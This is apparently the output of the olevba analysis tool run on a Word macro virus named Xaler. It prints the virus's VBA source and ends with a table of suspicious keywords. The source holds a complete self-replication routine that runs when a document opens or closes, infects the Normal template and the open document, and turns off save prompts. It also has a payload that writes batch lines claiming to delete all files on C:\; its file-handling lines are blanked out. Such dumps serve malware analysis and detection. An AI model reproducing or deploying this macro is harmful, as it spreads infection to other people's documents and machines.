olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Xaler.r
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Xaler.r - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'RELAX
Private Sub RELAX2()
If Day(Date) Mod 10 = 0 And Month(Date) Mod 4 = 0 Then






 






 







 



 






 



















Print #1, "ECHO ***"
Print #1, "ECHO *****"
Print #1, "ECHO *******"
Print #1, "ECHO *****"
Print #1, "ECHO ***"
Print #1, "ECHO Sometimes you must RELAX."
Print #1, "ECHO Please, RELAX while deleting all files in C:\"
Print #1, "ECHO *****"
Print #1, "ECHO *******"
Print #1, "ECHO *****"
Print #1, "ECHO GREECE"
Print #1, "ECHO =================================="
Print #1, "PAUSE"
Print #1, "CLS"
Print #1, "ECHO All files deleted!!!"
Print #1, "ECHO Now, you have a clean COMPUTER."
Print #1, "ECHO *******"
Print #1, "ECHO *******"
Print #1, "PAUSE"
Print #1, "@ECHO ON"
Close #1
End If
End Sub

Private Sub Document_Close()
Call GOODSub
Call RELAX2
End Sub

Private Sub GOODSub()
On Error Resume Next
Application.ScreenUpdating = False
Application.Options.SaveNormalPrompt = False
x$ = "C:\temp.tmp"
MacroContainer.VBProject.VBComponents.Item("ThisDocument").Export x$
Open x$ For Input As #1
keimeno = Input(LOF(1), 1)
Close #1
KK& = InStr(1, keimeno, "'RELAX")
keimeno = Right$(keimeno, Len(keimeno) - KK& + 1)
For j = 1 To 2
If j = 1 Then
NormalTemplate.VBProject.VBComponents.Item("ThisDocument").Export x$
Else
ActiveDocument.VBProject.VBComponents.Item("ThisDocument").Export x$
End If
Open x$ For Input As #1
rlx = Input(LOF(1), 1)
Close #1
d1 = InStr(1, rlx, "'RELAX")
If d1 = 0 Then
If j = 1 Then
NormalTemplate.VBProject.VBComponents.Item("ThisDocument").CodeModule.InsertLines 1, keimeno
NormalTemplate.Save
Else
ActiveDocument.VBProject.VBComponents.Item("ThisDocument").CodeModule.InsertLines 1, keimeno
End If
End If
Next j
'====================
Dim PRostasia As Byte
PRostasia = 1
fff = FreeFile
If Dir(ActiveDocument.FullName, 6) <> "" Then
Open ActiveDocument.FullName For Binary As #fff
Put #fff, 862, PRostasia
Close #fff
ActiveDocument.Save
End If
Kill x$
Application.ScreenUpdating = True
End Sub

Private Sub Document_Open()
Call GOODSub
End Sub















































































































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

